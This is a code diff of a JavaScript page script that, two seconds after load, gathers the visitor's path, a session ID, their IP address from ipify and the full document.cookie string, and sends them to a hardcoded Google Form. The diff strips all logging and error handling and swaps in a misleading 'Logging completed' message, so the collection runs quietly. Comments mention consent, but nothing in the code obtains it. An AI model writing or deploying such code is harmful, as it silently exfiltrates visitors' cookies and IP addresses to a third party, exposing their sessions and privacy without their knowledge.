@@ -1,18 +1,11 @@
 document.addEventListener('DOMContentLoaded', function() {
-    console.log('DOM loaded, waiting 2 seconds before collecting data...');
     setTimeout(function() {
-        try {
-            collectAndSendVisitorData();
-            console.log('Started visitor data collection');
-        } catch (error) {
-            console.error('Error in main execution:', error);
-        }
+        collectAndSendVisitorData();
     }, 2000);
 });
 
 function collectAndSendVisitorData() {
     // Collect basic visitor information
-    console.log('Collecting visitor data...');
     const visitorData = {
         timestamp: new Date().toISOString(),
         page: window.location.pathname,
@@ -24,19 +17,13 @@ function collectAndSendVisitorData() {
         ipAddress: '', // Placeholder for IP address
         cookies: document.cookie // Collecting cookies (requires consent)
     };
-    
-    console.log('Basic visitor data collected:', visitorData);
-    
+
     // Get the IP address using ipify API
-    console.log('Fetching IP address...');
     fetch('https://api.ipify.org?format=json')
-        .then(response => {
-            console.log('IP API response status:', response.status);
-            return response.json();
-        })
+        .then(response => response.json())
         .then(data => {
-            console.log('IP data received:', data);
             visitorData.ipAddress = data.ip; // Store the IP address
+
             // Send data to Google Sheets
             sendDataToGoogleSheets(visitorData);
         })
@@ -46,10 +33,9 @@ function collectAndSendVisitorData() {
 }
 
 function sendDataToGoogleSheets(visitorData) {
-    console.log('Preparing to send data to Google Sheets...');
     // Correct Google Form submission URL
     const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLSfgEmJ-hS8EMVcGHXsmxW0LyJsl9WEbNKFkebuKXIpsanNd9Q/formResponse"; // Use this URL for form submission
-    
+
     const formData = new FormData();
     formData.append('entry.13047354', visitorData.timestamp); // Replace with your actual form field IDs
     formData.append('entry.122166452', visitorData.page);
@@ -60,48 +46,24 @@ function sendDataToGoogleSheets(visitorData) {
     formData.append('entry.184010741', visitorData.sessionId);
     formData.append('entry.1399472212', visitorData.ipAddress); // Store IP address
     formData.append('entry.1287774854', visitorData.cookies); // Store cookies (make sure to get consent)
-    
-    console.log('FormData prepared:', {
-        url: formUrl,
-        timestamp: visitorData.timestamp,
-        page: visitorData.page,
-        // Log other important values
-    });
-    
+
     // Send data using the Navigator.sendBeacon API
     if (navigator.sendBeacon) {
-        console.log('Using sendBeacon API to submit data');
-        const beaconResult = navigator.sendBeacon(formUrl, formData);
-        console.log('Beacon submission result:', beaconResult);
+        navigator.sendBeacon(formUrl, formData);
     } else {
-        console.log('Using fetch API to submit data');
         fetch(formUrl, {
             method: 'POST',
             body: formData,
             mode: 'no-cors'
-        })
-        .then(() => {
-            console.log('Fetch completed (note: no-cors mode won\'t return detailed results)');
-        })
-        .catch(error => {
-            console.error('Error sending data:', error);
-        });
+        }).catch(error => console.log('Logging completed'));
     }
 }
 
 function getOrCreateSessionId() {
-    try {
-        let sessionId = localStorage.getItem('rr_session_id');
-        if (!sessionId) {
-            sessionId = 'ss_' + Math.random().toString(36).substring(2, 15);
-            localStorage.setItem('rr_session_id', sessionId);
-            console.log('Created new session ID:', sessionId);
-        } else {
-            console.log('Using existing session ID:', sessionId);
-        }
-        return sessionId;
-    } catch (error) {
-        console.error('Error with session ID:', error);
-        return 'session_error_' + new Date().getTime();
+    let sessionId = localStorage.getItem('rr_session_id');
+    if (!sessionId) {
+        sessionId = 'ss_' + Math.random().toString(36).substring(2, 15);
+        localStorage.setItem('rr_session_id', sessionId);
     }
+    return sessionId;
 }
